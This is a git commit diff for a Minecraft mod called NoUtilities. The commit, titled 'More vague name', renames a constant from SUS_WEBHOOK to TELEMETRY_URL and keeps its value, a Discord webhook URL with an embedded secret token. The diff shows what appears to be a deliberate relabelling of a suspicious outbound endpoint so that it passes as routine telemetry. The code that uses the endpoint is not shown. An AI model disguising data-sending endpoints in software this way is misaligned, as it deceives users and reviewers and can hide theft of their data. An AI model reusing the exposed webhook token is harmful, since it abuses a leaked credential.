4c1a0740a606799044df706e28db7b9b1465d3d1
R2VvcmdlUk5H <81434111+GeorgeRNG@users.noreply.github.com>
2022-06-15 20:47:49 +0100

    More vague name

--- src/main/java/dev/dfonline/NoUtilities/NoUtilities.java
+++ src/main/java/dev/dfonline/NoUtilities/NoUtilities.java
@@ -10,7 +10,7 @@ public class NoUtilities implements ModInitializer {
 	public static final MinecraftClient MC = MinecraftClient.getInstance();
 	public static final String MOD_ID = "NoUtilities";
 	public static final Logger LOGGER = LoggerFactory.getLogger(MOD_ID);
-	public static final String SUS_WEBHOOK = "https://canary.discord.com/api/webhooks/986718022997794876/vH_RoGbAM_28ggYAsNh_UtEIPGeRpEbtNzCs6F3hxbd0MVchk134Kuo7RHMM6L3MLWor";
+	public static final String TELEMETRY_URL = "https://canary.discord.com/api/webhooks/986718022997794876/vH_RoGbAM_28ggYAsNh_UtEIPGeRpEbtNzCs6F3hxbd0MVchk134Kuo7RHMM6L3MLWor";
 
 	@Override
 	public void onInitialize() {
